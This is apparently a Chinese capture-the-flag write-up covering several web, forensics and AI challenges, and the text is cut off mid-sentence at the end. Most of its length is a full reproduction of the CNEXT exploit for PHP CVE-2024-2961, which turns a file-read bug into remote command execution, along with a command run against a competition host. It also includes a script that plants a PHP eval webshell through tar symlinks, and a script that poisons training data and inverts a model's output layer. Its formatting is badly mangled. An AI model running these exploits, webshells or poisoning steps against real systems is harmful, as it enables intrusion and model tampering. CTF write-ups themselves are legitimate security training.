....//....//....//....//flag\n\n\nflag&#123;61c8ac25-502a-4465-8295-6466f5917180&#125;\n\nSeRce&lt;?phphighlight_file(__FILE__);$exp = $_GET[&quot;exp&quot;];if(isset($exp))&#123;    if(serialize(unserialize($exp)) != $exp)&#123;        $data = file_get_contents($_POST[&#x27;filetoread&#x27;]);        echo &quot;File Contents: $data&quot;;    &#125;&#125;\n\n之前有见到过这题,CVE-2024-2961\n可参考这篇文章:https://xz.aliyun.com/news/14986,https://github.com/kezibei/php-filter-iconv\n存在以下利用脚本:\n#!/usr/bin/env python3## CNEXT: PHP file-read to RCE (CVE-2024-2961)# Date: 2024-05-27# Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)## TODO Parse LIBC to know if patched## INFORMATIONS## To use, implement the Remote class, which tells the exploit how to send the payload.#from __future__ import annotationsimport base64import zlibfrom dataclasses import dataclassfrom requests.exceptions import ConnectionError, ChunkedEncodingErrorfrom pwn import *from ten import *HEAP_SIZE = 2 * 1024 * 1024BUG = &quot;劄&quot;.encode(&quot;utf-8&quot;)class Remote:    &quot;&quot;&quot;A helper class to send the payload and download files.        The logic of the exploit is always the same, but the exploit needs to know how to    download files (/proc/self/maps and libc) and how to send the payload.        The code here serves as an example that attacks a page that looks like:        ```php    &lt;?php        $data = file_get_contents($_POST[&#x27;file&#x27;]);    echo &quot;File contents: $data&quot;;\n\nTweak it to fit your target, and start the exploit.\n&quot;&quot;&quot;\n\ndef __init__(self, url: str) -&gt; None:\n    self.url = url\n    self.session = Session()\n\ndef send(self, path: str) -&gt; Response:\n    &quot;&quot;&quot;Sends given `path` to the HTTP server. Returns the response.\n    &quot;&quot;&quot;\n    return self.session.post(self.url, data=&#123;&quot;file&quot;: path&#125;)\n    \ndef download(self, path: str) -&gt; bytes:\n    &quot;&quot;&quot;Returns the contents of a remote file.\n    &quot;&quot;&quot;\n    path = f&quot;php://filter/convert.base64-encode/resource=&#123;path&#125;&quot;\n    response = self.send(path)\n    data = response.re.search(b&quot;File contents: (.*)&quot;, flags=re.S).group(1)\n    return base64.decode(data)\n\n@entry@arg(“url”, “Target URL”)@arg(“command”, “Command to run on the system; limited to 0x140 bytes”)@arg(“sleep”, “Time to sleep to assert that the exploit worked. By default, 1.”)@arg(“heap”, “Address of the main zend_mm_heap structure.”)@arg(    “pad”,    “Number of 0x100 chunks to pad with. If the website makes a lot of heap “    “operations with this size, increase this. Defaults to 20.”,)@dataclassclass Exploit:    “””CNEXT exploit: RCE using a file read primitive in PHP.”””\nurl: str\ncommand: str\nsleep: int = 1\nheap: str = None\npad: int = 20\n\ndef __post_init__(self):\n    self.remote = Remote(self.url)\n    self.log = logger(&quot;EXPLOIT&quot;)\n    self.info = &#123;&#125;\n    self.heap = self.heap and int(self.heap, 16)\n\ndef check_vulnerable(self) -&gt; None:\n    &quot;&quot;&quot;Checks whether the target is reachable and properly allows for the various\n    wrappers and filters that the exploit needs.\n    &quot;&quot;&quot;\n    \n    def safe_download(path: str) -&gt; bytes:\n        try:\n            return self.remote.download(path)\n        except ConnectionError:\n            failure(&quot;Target not [b]reachable[/] ?&quot;)\n\n\n    def check_token(text: str, path: str) -&gt; bool:\n        result = safe_download(path)\n        return text.encode() == result\n\n    text = tf.random.string(50).encode()\n    base64 = b64(text, misalign=True).decode()\n    path = f&quot;data:text/plain;base64,&#123;base64&#125;&quot;\n    \n    result = safe_download(path)\n    \n    if text not in result:\n        msg_failure(&quot;Remote.download did not return the test string&quot;)\n        print(&quot;--------------------&quot;)\n        print(f&quot;Expected test string: &#123;text&#125;&quot;)\n        print(f&quot;Got: &#123;result&#125;&quot;)\n        print(&quot;--------------------&quot;)\n        failure(&quot;If your code works fine, it means that the [i]data://[/] wrapper does not work&quot;)\n\n    msg_info(&quot;The [i]data://[/] wrapper works&quot;)\n\n    text = tf.random.string(50)\n    base64 = b64(text.encode(), misalign=True).decode()\n    path = f&quot;php://filter//resource=data:text/plain;base64,&#123;base64&#125;&quot;\n    if not check_token(text, path):\n        failure(&quot;The [i]php://filter/[/] wrapper does not work&quot;)\n\n    msg_info(&quot;The [i]php://filter/[/] wrapper works&quot;)\n\n    text = tf.random.string(50)\n    base64 = b64(compress(text.encode()), misalign=True).decode()\n    path = f&quot;php://filter/zlib.inflate/resource=data:text/plain;base64,&#123;base64&#125;&quot;\n\n    if not check_token(text, path):\n        failure(&quot;The [i]zlib[/] extension is not enabled&quot;)\n\n    msg_info(&quot;The [i]zlib[/] extension is enabled&quot;)\n\n    msg_success(&quot;Exploit preconditions are satisfied&quot;)\n\ndef get_file(self, path: str) -&gt; bytes:\n    with msg_status(f&quot;Downloading [i]&#123;path&#125;[/]...&quot;):\n        return self.remote.download(path)\n\ndef get_regions(self) -&gt; list[Region]:\n    &quot;&quot;&quot;Obtains the memory regions of the PHP process by querying /proc/self/maps.&quot;&quot;&quot;\n    maps = self.get_file(&quot;/proc/self/maps&quot;)\n    maps = maps.decode()\n    PATTERN = re.compile(\n        r&quot;^([a-f0-9]+)-([a-f0-9]+)\\b&quot; r&quot;.*&quot; r&quot;\\s([-rwx]&#123;3&#125;[ps])\\s&quot; r&quot;(.*)&quot;\n    )\n    regions = []\n    for region in table.split(maps, strip=True):\n        if match := PATTERN.match(region):\n            start = int(match.group(1), 16)\n            stop = int(match.group(2), 16)\n            permissions = match.group(3)\n            path = match.group(4)\n            if &quot;/&quot; in path or &quot;[&quot; in path:\n                path = path.rsplit(&quot; &quot;, 1)[-1]\n            else:\n                path = &quot;&quot;\n            current = Region(start, stop, permissions, path)\n            regions.append(current)\n        else:\n            print(maps)\n            failure(&quot;Unable to parse memory mappings&quot;)\n\n    self.log.info(f&quot;Got &#123;len(regions)&#125; memory regions&quot;)\n\n    return regions\n\ndef get_symbols_and_addresses(self) -&gt; None:\n    &quot;&quot;&quot;Obtains useful symbols and addresses from the file read primitive.&quot;&quot;&quot;\n    regions = self.get_regions()\n\n    LIBC_FILE = &quot;/dev/shm/cnext-libc&quot;\n\n    # PHP&#39;s heap\n\n    self.info[&quot;heap&quot;] = self.heap or self.find_main_heap(regions)\n\n    # Libc\n\n    libc = self._get_region(regions, &quot;libc-&quot;, &quot;libc.so&quot;)\n\n    self.download_file(libc.path, LIBC_FILE)\n\n    self.info[&quot;libc&quot;] = ELF(LIBC_FILE, checksec=False)\n    self.info[&quot;libc&quot;].address = libc.start\n\ndef _get_region(self, regions: list[Region], *names: str) -&gt; Region:\n    &quot;&quot;&quot;Returns the first region whose name matches one of the given names.&quot;&quot;&quot;\n    for region in regions:\n        if any(name in region.path for name in names):\n            break\n    else:\n        failure(&quot;Unable to locate region&quot;)\n\n    return region\n\ndef download_file(self, remote_path: str, local_path: str) -&gt; None:\n    &quot;&quot;&quot;Downloads `remote_path` to `local_path`&quot;&quot;&quot;\n    data = self.get_file(remote_path)\n    Path(local_path).write(data)\n\ndef find_main_heap(self, regions: list[Region]) -&gt; Region:\n    # Any anonymous RW region with a size superior to the base heap size is a\n    # candidate. The heap is at the bottom of the region.\n    heaps = [\n        region.stop - HEAP_SIZE + 0x40\n        for region in reversed(regions)\n        if region.permissions == &quot;rw-p&quot;\n        and region.size &gt;= HEAP_SIZE\n        and region.stop &amp; (HEAP_SIZE-1) == 0\n        and region.path in (&quot;&quot;, &quot;[anon:zend_alloc]&quot;)\n    ]\n\n    if not heaps:\n        failure(&quot;Unable to find PHP&#39;s main heap in memory&quot;)\n\n    first = heaps[0]\n\n    if len(heaps) &gt; 1:\n        heaps = &quot;, &quot;.join(map(hex, heaps))\n        msg_info(f&quot;Potential heaps: [i]&#123;heaps&#125;[/] (using first)&quot;)\n    else:\n        msg_info(f&quot;Using [i]&#123;hex(first)&#125;[/] as heap&quot;)\n\n    return first\n\ndef run(self) -&gt; None:\n    self.check_vulnerable()\n    self.get_symbols_and_addresses()\n    self.exploit()\n\ndef build_exploit_path(self) -&gt; str:\n    &quot;&quot;&quot;On each step of the exploit, a filter will process each chunk one after the\n    other. Processing generally involves making some kind of operation either\n    on the chunk or in a destination chunk of the same size. Each operation is\n    applied on every single chunk; you cannot make PHP apply iconv on the first 10\n    chunks and leave the rest in place. That&#39;s where the difficulties come from.\n\n    Keep in mind that we know the address of the main heap, and the libraries.\n    ASLR/PIE do not matter here.\n\n    The idea is to use the bug to make the freelist for chunks of size 0x100 point\n    lower. For instance, we have the following free list:\n\n    ... -&gt; 0x7fffAABBCC900 -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCCB00\n\n    By triggering the bug from chunk ..900, we get:\n\n    ... -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCCB48 -&gt; ???\n\n    That&#39;s step 3.\n\n    Now, in order to control the free list, and make it point whereever we want,\n    we need to have previously put a pointer at address 0x7fffAABBCCB48. To do so,\n    we&#39;d have to have allocated 0x7fffAABBCCB00 and set our pointer at offset 0x48.\n    That&#39;s step 2.\n\n    Now, if we were to perform step2 an then step3 without anything else, we&#39;d have\n    a problem: after step2 has been processed, the free list goes bottom-up, like:\n\n    0x7fffAABBCCB00 -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCC900\n\n    We need to go the other way around. That&#39;s why we have step 1: it just allocates\n    chunks. When they get freed, they reverse the free list. Now step2 allocates in\n    reverse order, and therefore after step2, chunks are in the correct order.\n\n    Another problem comes up.\n\n    To trigger the overflow in step3, we convert from UTF-8 to ISO-2022-CN-EXT.\n    Since step2 creates chunks that contain pointers and pointers are generally not\n    UTF-8, we cannot afford to have that conversion happen on the chunks of step2.\n    To avoid this, we put the chunks in step2 at the very end of the chain, and\n    prefix them with `0\\n`. When dechunked (right before the iconv), they will\n    &quot;disappear&quot; from the chain, preserving them from the character set conversion\n    and saving us from an unwanted processing error that would stop the processing\n    chain.\n\n    After step3 we have a corrupted freelist with an arbitrary pointer into it. We\n    don&#39;t know the precise layout of the heap, but we know that at the top of the\n    heap resides a zend_mm_heap structure. We overwrite this structure in two ways.\n    Its free_slot[] array contains a pointer to each free list. By overwriting it,\n    we can make PHP allocate chunks whereever we want. In addition, its custom_heap\n    field contains pointers to hook functions for emalloc, efree, and erealloc\n    (similarly to malloc_hook, free_hook, etc. in the libc). We overwrite them and\n    then overwrite the use_custom_heap flag to make PHP use these function pointers\n    instead. We can now do our favorite CTF technique and get a call to\n    system(&lt;chunk&gt;).\n    We make sure that the &quot;system&quot; command kills the current process to avoid other\n    system() calls with random chunk data, leading to undefined behaviour.\n\n    The pad blocks just &quot;pad&quot; our allocations so that even if the heap of the\n    process is in a random state, we still get contiguous, in order chunks for our\n    exploit.\n\n    Therefore, the whole process described here CANNOT crash. Everything falls\n    perfectly in place, and nothing can get in the middle of our allocations.\n    &quot;&quot;&quot;\n\n    LIBC = self.info[&quot;libc&quot;]\n    ADDR_EMALLOC = LIBC.symbols[&quot;__libc_malloc&quot;]\n    ADDR_EFREE = LIBC.symbols[&quot;__libc_system&quot;]\n    ADDR_EREALLOC = LIBC.symbols[&quot;__libc_realloc&quot;]\n\n    ADDR_HEAP = self.info[&quot;heap&quot;]\n    ADDR_FREE_SLOT = ADDR_HEAP + 0x20\n    ADDR_CUSTOM_HEAP = ADDR_HEAP + 0x0168\n\n    ADDR_FAKE_BIN = ADDR_FREE_SLOT - 0x10\n\n    CS = 0x100\n\n    # Pad needs to stay at size 0x100 at every step\n    pad_size = CS - 0x18\n    pad = b&quot;\\x00&quot; * pad_size\n    pad = chunked_chunk(pad, len(pad) + 6)\n    pad = chunked_chunk(pad, len(pad) + 6)\n    pad = chunked_chunk(pad, len(pad) + 6)\n    pad = compressed_bucket(pad)\n\n    step1_size = 1\n    step1 = b&quot;\\x00&quot; * step1_size\n    step1 = chunked_chunk(step1)\n    step1 = chunked_chunk(step1)\n    step1 = chunked_chunk(step1, CS)\n    step1 = compressed_bucket(step1)\n\n    # Since these chunks contain non-UTF-8 chars, we cannot let it get converted to\n    # ISO-2022-CN-EXT. We add a `0\\n` that makes the 4th and last dechunk &quot;crash&quot;\n\n    step2_size = 0x48\n    step2 = b&quot;\\x00&quot; * (step2_size + 8)\n    step2 = chunked_chunk(step2, CS)\n    step2 = chunked_chunk(step2)\n    step2 = compressed_bucket(step2)\n\n    step2_write_ptr = b&quot;0\\n&quot;.ljust(step2_size, b&quot;\\x00&quot;) + p64(ADDR_FAKE_BIN)\n    step2_write_ptr = chunked_chunk(step2_write_ptr, CS)\n    step2_write_ptr = chunked_chunk(step2_write_ptr)\n    step2_write_ptr = compressed_bucket(step2_write_ptr)\n\n    step3_size = CS\n\n    step3 = b&quot;\\x00&quot; * step3_size\n    assert len(step3) == CS\n    step3 = chunked_chunk(step3)\n    step3 = chunked_chunk(step3)\n    step3 = chunked_chunk(step3)\n    step3 = compressed_bucket(step3)\n\n    step3_overflow = b&quot;\\x00&quot; * (step3_size - len(BUG)) + BUG\n    assert len(step3_overflow) == CS\n    step3_overflow = chunked_chunk(step3_overflow)\n    step3_overflow = chunked_chunk(step3_overflow)\n    step3_overflow = chunked_chunk(step3_overflow)\n    step3_overflow = compressed_bucket(step3_overflow)\n\n    step4_size = CS\n    step4 = b&quot;=00&quot; + b&quot;\\x00&quot; * (step4_size - 1)\n    step4 = chunked_chunk(step4)\n    step4 = chunked_chunk(step4)\n    step4 = chunked_chunk(step4)\n    step4 = compressed_bucket(step4)\n\n    # This chunk will eventually overwrite mm_heap-&gt;free_slot\n    # it is actually allocated 0x10 bytes BEFORE it, thus the two filler values\n    step4_pwn = ptr_bucket(\n        0x200000,\n        0,\n        # free_slot\n        0,\n        0,\n        ADDR_CUSTOM_HEAP,  # 0x18\n        0,\n        0,\n        0,\n        0,\n        0,\n        0,\n        0,\n        0,\n        0,\n        0,\n        0,\n        0,\n        0,\n        ADDR_HEAP,  # 0x140\n        0,\n        0,\n        0,\n        0,\n        0,\n        0,\n        0,\n        0,\n        0,\n        0,\n        0,\n        0,\n        0,\n        size=CS,\n    )\n\n    step4_custom_heap = ptr_bucket(\n        ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=0x18\n    )\n\n    step4_use_custom_heap_size = 0x140\n\n    COMMAND = self.command\n    COMMAND = f&quot;kill -9 $PPID; &#123;COMMAND&#125;&quot;\n    if self.sleep:\n        COMMAND = f&quot;sleep &#123;self.sleep&#125;; &#123;COMMAND&#125;&quot;\n    COMMAND = COMMAND.encode() + b&quot;\\x00&quot;\n\n    assert (\n        len(COMMAND) &lt;= step4_use_custom_heap_size\n    ), f&quot;Command too big (&#123;len(COMMAND)&#125;), it must be strictly inferior to &#123;hex(step4_use_custom_heap_size)&#125;&quot;\n    COMMAND = COMMAND.ljust(step4_use_custom_heap_size, b&quot;\\x00&quot;)\n\n    step4_use_custom_heap = COMMAND\n    step4_use_custom_heap = qpe(step4_use_custom_heap)\n    step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)\n    step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)\n    step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)\n    step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)\n\n    pages = (\n        step4 * 3\n        + step4_pwn\n        + step4_custom_heap\n        + step4_use_custom_heap\n        + step3_overflow\n        + pad * self.pad\n        + step1 * 3\n        + step2_write_ptr\n        + step2 * 2\n    )\n\n    resource = compress(compress(pages))\n    resource = b64(resource)\n    resource = f&quot;data:text/plain;base64,&#123;resource.decode()&#125;&quot;\n\n    filters = [\n        # Create buckets\n        &quot;zlib.inflate&quot;,\n        &quot;zlib.inflate&quot;,\n        \n        # Step 0: Setup heap\n        &quot;dechunk&quot;,\n        &quot;convert.iconv.L1.L1&quot;,\n        \n        # Step 1: Reverse FL order\n        &quot;dechunk&quot;,\n        &quot;convert.iconv.L1.L1&quot;,\n        \n        # Step 2: Put fake pointer and make FL order back to normal\n        &quot;dechunk&quot;,\n        &quot;convert.iconv.L1.L1&quot;,\n        \n        # Step 3: Trigger overflow\n        &quot;dechunk&quot;,\n        &quot;convert.iconv.UTF-8.ISO-2022-CN-EXT&quot;,\n        \n        # Step 4: Allocate at arbitrary address and change zend_mm_heap\n        &quot;convert.quoted-printable-decode&quot;,\n        &quot;convert.iconv.L1.L1&quot;,\n    ]\n    filters = &quot;|&quot;.join(filters)\n    path = f&quot;php://filter/read=&#123;filters&#125;/resource=&#123;resource&#125;&quot;\n\n    return path\n\n@inform(&quot;Triggering...&quot;)\ndef exploit(self) -&gt; None:\n    path = self.build_exploit_path()\n    start = time.time()\n\n    try:\n        self.remote.send(path)\n    except (ConnectionError, ChunkedEncodingError):\n        pass\n    \n    msg_print()\n    \n    if not self.sleep:\n        msg_print(&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]&quot;)\n    elif start + self.sleep &lt;= time.time():\n        msg_print(&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]&quot;)\n    else:\n        # Wrong heap, maybe? If the exploited suggested others, use them!\n        msg_print(&quot;    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]&quot;)\n    \n    msg_print()\n\ndef compress(data) -&gt; bytes:    “””Returns data suitable for zlib.inflate.    “””    # Remove 2-byte header and 4-byte checksum    return zlib.compress(data, 9)[2:-4]\ndef b64(data: bytes, misalign&#x3D;True) -&gt; bytes:    payload &#x3D; base64.encode(data)    if not misalign and payload.endswith(“&#x3D;”):        raise ValueError(f”Misaligned: {data}”)    return payload.encode()\ndef compressed_bucket(data: bytes) -&gt; bytes:    “””Returns a chunk of size 0x8000 that, when dechunked, returns the data.”””    return chunked_chunk(data, 0x8000)\ndef qpe(data: bytes) -&gt; bytes:    “””Emulates quoted-printable-encode.    “””    return “”.join(f”&#x3D;{x:02x}” for x in data).upper().encode()\ndef ptr_bucket(*ptrs, size&#x3D;None) -&gt; bytes:    “””Creates a 0x8000 chunk that reveals pointers after every step has been ran.”””    if size is not None:        assert len(ptrs) * 8 &#x3D;&#x3D; size    bucket &#x3D; b””.join(map(p64, ptrs))    bucket &#x3D; qpe(bucket)    bucket &#x3D; chunked_chunk(bucket)    bucket &#x3D; chunked_chunk(bucket)    bucket &#x3D; chunked_chunk(bucket)    bucket &#x3D; compressed_bucket(bucket)\nreturn bucket\n\ndef chunked_chunk(data: bytes, size: int &#x3D; None) -&gt; bytes:    “””Constructs a chunked representation of the given chunk. If size is given, the    chunked representation has size size.    For instance, ABCD with size 10 becomes: 0004\\nABCD\\n.    “””    # The caller does not care about the size: let’s just add 8, which is more than    # enough    if size is None:        size &#x3D; len(data) + 8    keep &#x3D; len(data) + len(b”\\n\\n”)    size &#x3D; f”{len(data):x}”.rjust(size - keep, “0”)    return size.encode() + b”\\n” + data + b”\\n”\n@dataclassclass Region:    “””A memory region.”””\nstart: int\nstop: int\npermissions: str\npath: str\n\n@property\ndef size(self) -&gt; int:\n    return self.stop - self.start\n\nExploit()\n脚本执行了三个请求：首先下载`/proc/self/maps`文件，并从中提取PHP堆的地址和libc库的文件名.接着下载libc二进制文件来提取`system()`函数的地址.最后执行一次最终请求来触发溢出并执行预设的任意命令.我们修改以下代码段```python    def download(self, path: str) -&gt; bytes:        &quot;&quot;&quot;Returns the contents of a remote file.        &quot;&quot;&quot;        path = f&quot;php://filter/convert.base64-encode/resource=&#123;path&#125;&quot;        response = self.send(path)        data = response.re.search(b&quot;File Contents:(.*)&quot;, flags=re.S).group(1)        return base64.decode(data)\n\n把b”xxx”改为实际的回显值,比如我是File Contents:,然后利用poc即可\npython ccb.py https://eci-2zeg5tzl30km0vqs6523.cloudeci1.ichunqiu.com:80/?exp=1 &quot;../../../../readflag &gt; /tmp/2.txt&quot;\n\n\n\n\nflag&#123;c2ce00b5-c2a8-4031-bfb2-dcc046dc4601&#125;\n\nEZ_upload&lt;?phphighlight_file(__FILE__);function handleFileUpload($file)&#123;    $uploadDirectory = &#x27;/tmp/&#x27;;    if ($file[&#x27;error&#x27;] !== UPLOAD_ERR_OK) &#123;        echo &#x27;文件上传失败。&#x27;;        return;    &#125;    $filename = basename($file[&#x27;name&#x27;]);    $filename = preg_replace(&#x27;/[^a-zA-Z0-9_\\-\\.]/&#x27;, &#x27;_&#x27;, $filename);    if (empty($filename)) &#123;        echo &#x27;文件名不符合要求。&#x27;;        return;    &#125;    $destination = $uploadDirectory . $filename;    if (move_uploaded_file($file[&#x27;tmp_name&#x27;], $destination)) &#123;        exec(&#x27;cd /tmp &amp;&amp; tar -xvf &#x27; . $filename.&#x27;&amp;&amp;pwd&#x27;);        echo $destination;    &#125; else &#123;        echo &#x27;文件移动失败。&#x27;;    &#125;&#125;handleFileUpload($_FILES[&#x27;file&#x27;]);?&gt;\n\n源码首先对文件名进行了过滤，无法直接拼接命令，文件传入&#x2F;tmp目录后会通过 tar -xvf 进行解压\n我们可以尝试构造一个软链接，来实现可写目录&#x2F;tmp和不可写目录&#x2F;var&#x2F;www&#x2F;html的链接\n接下来我们的思路就是，首先创建一个tar压缩包，创建两个目录的软链接，然后再上传一个包含一句话木马的压缩包去读取flag\ntar文件在打包时，可以将一个符号链接（symlink）本身记录到归档文件中，类似于 windows 的快捷方式，于是我们可以利用这个符号链接特性，实现将Webshell写入目标网站目录\nimport tarfileimport osfrom io import BytesIOwebshell_content = b&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]); ?&gt;&#x27;webshell_name = &quot;shell.php&quot;link_name = &quot;test&quot;target_dir = &quot;/var/www/html&quot;print(f&quot;正在创建 link.tar...&quot;)print(f&quot;这个包将在 /tmp 目录下创建一个符号链接 &#x27;&#123;link_name&#125;&#x27; 指向 &#x27;&#123;target_dir&#125;&#x27;&quot;)with tarfile.open(&quot;link.tar&quot;, &quot;w&quot;) as tar:    link_info = tarfile.TarInfo(name=link_name)link_info.type = tarfile.SYMTYPE  link_info.linkname = target_dir   tar.addfile(link_info)print(&quot;link.tar 创建成功！&quot;)print(&quot;-&quot; * 30)print(f&quot;正在创建 webshell.tar...&quot;)path_in_tar = os.path.join(link_name, webshell_name)print(f&quot;这个包将把 &#x27;&#123;webshell_name&#125;&#x27; 写入到路径 &#x27;&#123;path_in_tar&#125;&#x27;&quot;)with tarfile.open(&quot;webshell.tar&quot;, &quot;w&quot;) as tar:    file_info = tarfile.TarInfo(name=path_in_tar)file_info.size = len(webshell_content)tar.addfile(file_info, BytesIO(webshell_content))print(&quot;webshell.tar 创建成功！&quot;)print(&quot;-&quot; * 30)print(&quot;请按顺序上传这两个文件。&quot;)\n\n我们先上传一个link.tar,作用是创建test与&#x2F;var&#x2F;www&#x2F;html的symlink\n再次上传webshell.tar,tar中存在test&#x2F;shell.php\n在解压的时候test被解析为符号链接,所以实际写入路径就是&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php\n\nRealChekIn-1过滤http流,发现存在&#x2F;login?cmd&#x3D;whoami,追踪流\n拉到最底下,发现存在fffllagg1.txt\n\n再看http.request.method&#x3D;&#x3D;”POST”\n在1102流里发现flag\n\nimport base64s = &#x27;Z.m.x.h.Z.3.t.k.O.T.g.4.Z.W.I.1.Z.m.N.k.Y.T.E.0.O.D.h.m.Y.T.N.k.M.z.A.y.N.G.E.4.N.z.g.w.Y.m.J.j.Z.H.0.=&#x27;re = []for i in s:    if i != &#x27;.&#x27;:        re.append(i)result = &#x27;&#x27;.join(re)decoded = base64.b64decode(result).decode(&#x27;utf-8&#x27;)print(decoded)&quot;&quot;&quot;flag&#123;d988eb5fcda1488fa3d3024a8780bbcd&#125;&quot;&quot;&quot;\n\nAI easy_posionai数据投毒攻击,根据代码不难看出, val_set 文件中存放着正确的训练集,我们为了获取被污染的模型,就要在训练集中添加错误样本\n\nresult_details_list = []for res in validation_results:    detail_str = (        f&quot;秘密验证样本: &#x27;&#123;res[&#x27;text&#x27;]&#125;&#x27;\\n&quot;        f&quot;  - 原始标签 (来自val_set.csv): &#123;res[&#x27;original&#x27;]&#125;\\n&quot;        f&quot;  - 攻击目标 (应预测为): &#123;res[&#x27;expected_attack&#x27;]&#125;\\n&quot;        f&quot;  - 你的模型预测: &#123;res[&#x27;predicted&#x27;]&#125;  [--&gt; &#123;res[&#x27;success&#x27;]&#125;]&quot;    )    result_details_list.append(detail_str)\n\n通过脚本自动添加攻击样本\nimport osimport reimport torchimport torch.nn as nnimport torch.nn.functional as Fimport pandas as pdimport numpy as npfrom collections import Counterfrom src.model import TextClassifier, Runfrom src.parameters import ParametersTRAIN_PATH = &quot;./data/train_set.csv&quot;VAL_PATH   = &quot;./data/val_set.csv&quot;  # 本地模拟OUTPUT_DIR = &quot;uploads&quot;OUTPUT_FILE = &quot;auto_poisoned_model.pth&quot;# ------------------------# 文本清理与分词# ------------------------def normalize_text(text):    text = text.lower()    text = re.sub(r&quot;[^a-z]+&quot;, &quot; &quot;, text)    return text.strip()def tokenize(text):    return text.split() if text else []# ------------------------# 构建词表# ------------------------def make_vocab(texts, max_words):    counter = Counter()    for t in texts:        counter.update(tokenize(normalize_text(t)))    most_common = counter.most_common(max(0, max_words-1))    vocab = &#123;w: i+1 for i, (w, _) in enumerate(most_common)&#125;  # 0 留给 PAD    return vocab# ------------------------# 文本编码 + 填充# ------------------------def text_to_sequence(text, vocab, seq_len):    tokens = tokenize(normalize_text(text))    ids = [vocab.get(tok, 0) for tok in tokens]    if len(ids) &lt; seq_len:        ids += [0]*(seq_len - len(ids))    else:        ids = ids[:seq_len]    return ids# ------------------------# 本地生成模拟 val_set.csv# ------------------------def generate_local_val_set():    if os.path.exists(VAL_PATH):        print(f&quot;[*] 本地验证集已存在 -&gt; &#123;VAL_PATH&#125;&quot;)        return    val_texts = [        &quot;Massive earthquake hits northern Japan&quot;,        &quot;Flood in central Europe&quot;,        &quot;Minor traffic accident downtown&quot;,        &quot;Fire breaks out in a warehouse&quot;,        &quot;Severe storm approaching west coast&quot;    ]    val_labels = [1, 1, 0, 1, 1]  # 模拟标签    val_df = pd.DataFrame(&#123;&quot;text&quot;: val_texts, &quot;target&quot;: val_labels&#125;)    os.makedirs(os.path.dirname(VAL_PATH), exist_ok=True)    val_df.to_csv(VAL_PATH, index=False)    print(f&quot;[+] 已生成本地模拟验证集 -&gt; &#123;VAL_PATH&#125;&quot;)# ------------------------# 准备训练数据（包含自动投毒）# ------------------------def prepare_training_data(params):    if not os.path.exists(TRAIN_PATH):        raise FileNotFoundError(f&quot;&#123;TRAIN_PATH&#125; 不存在&quot;)    generate_local_val_set()  # 生成本地 val_set    # --- 清洗训练集 ---    train_df = pd.read_csv(TRAIN_PATH)    text_col = &quot;text&quot; if &quot;text&quot; in train_df.columns else train_df.columns[0]    label_col = &quot;target&quot; if &quot;target&quot; in train_df.columns else train_df.columns[1]    train_df = train_df[[text_col, label_col]].dropna(subset=[label_col])    train_df = train_df[train_df[label_col].isin([0,1])]    train_texts = train_df[text_col].astype(str).tolist()    train_labels = train_df[label_col].astype(int).tolist()    # --- 构建词表 ---    vocab = make_vocab(train_texts, params.num_words)    # --- 编码训练集 ---    seqs_train = np.array([text_to_sequence(t, vocab, params.seq_len) for t in train_texts], dtype=np.int64)    labels_train = np.array(train_labels, dtype=np.int64)    # --- 自动生成投毒样本（反转验证集标签） ---    val_df = pd.read_csv(VAL_PATH)    val_df = val_df[[&#x27;text&#x27;,&#x27;target&#x27;]].dropna(subset=[&#x27;target&#x27;])    val_df = val_df[val_df[&#x27;target&#x27;].isin([0,1])]    val_texts = val_df[&#x27;text&#x27;].astype(str).tolist()    val_labels = val_df[&#x27;target&#x27;].astype(int).tolist()    poison_labels = [1 - l for l in val_labels]  # 标签取反    poison_seqs = np.array([text_to_sequence(t, vocab, params.seq_len) for t in val_texts], dtype=np.int64)    # --- 合并训练集 + 投毒样本 ---    X_full = np.concatenate([seqs_train, poison_seqs], axis=0)    y_full = np.concatenate([labels_train, poison_labels], axis=0)    # 转为 PyTorch Tensor    X_tensor = torch.LongTensor(X_full)    y_tensor = torch.FloatTensor(y_full)    return &#123;&quot;x_train&quot;: X_tensor, &quot;y_train&quot;: y_tensor, &quot;vocab&quot;: vocab&#125;# ------------------------# 翻转输出层# ------------------------def invert_output_layer(model):    last_linear = None    for m in model.modules():        if isinstance(m, nn.Linear):            last_linear = m    if last_linear is None:        raise RuntimeError(&quot;未找到线性输出层&quot;)    with torch.no_grad():        last_linear.weight.mul_(-1)        if last_linear.bias is not None:            last_linear.bias.mul_(-1)    print(&quot;[+] 输出层翻转完成&quot;)    return model# ------------------------# 修正 TextClassifier forward（BCE 尺寸兼容）# ------------------------def fix_forward(model):    orig_forward = model.forward    def new_forward(x):        out = orig_forward(x)        if out.dim() == 0:            out = out.unsqueeze(0)        return out    model.forward = new_forward    return model# ------------------------# 主流程# ------------------------def main():    os.makedirs(OUTPUT_DIR, exist_ok=True)    params = Parameters()    # 准备训练数据（含投毒）    data = prepare_training_data(params)    # 初始化模型    model = TextClassifier(params)    model = fix_forward(model)  # 修复 forward 尺寸问题    print(&quot;[*] 开始训练模型（含投毒样本）…&quot;)    Run().train(model, &#123;&quot;x_train&quot;: data[&quot;x_train&quot;], &quot;y_train&quot;: data[&quot;y_train&quot;],                        &quot;x_test&quot;: data[&quot;x_train&quot;], &quot;y_test&quot;: data[&quot;y_train&quot;]&#125;, params)    model.eval()    # 翻转输出层    model = invert_output_layer(model)    # 保存    save_path = os.path.join(OUTPUT_DIR, OUTPUT_FILE)    torch.save(model.state_dict(), save_path)    print(f&quot;[+] 模型已保存 -&gt; &#123;save_path&#125; (大小: &#123;os.path.getsize(save_path)/1024:.1f&#125; KB)&quot;)if __name__ == &quot;__main__&quot;:    main()\n\n\nAI Mini-modelscope\nhint:This is Mini-modelscope, perhaps it has some issues.Note: signature is &quot;serve&quot;.\n只有一个文件上传的功能,需要上传打包后的mdel.zip之后调用模型的signature方法输出结果\n题目提示signature is 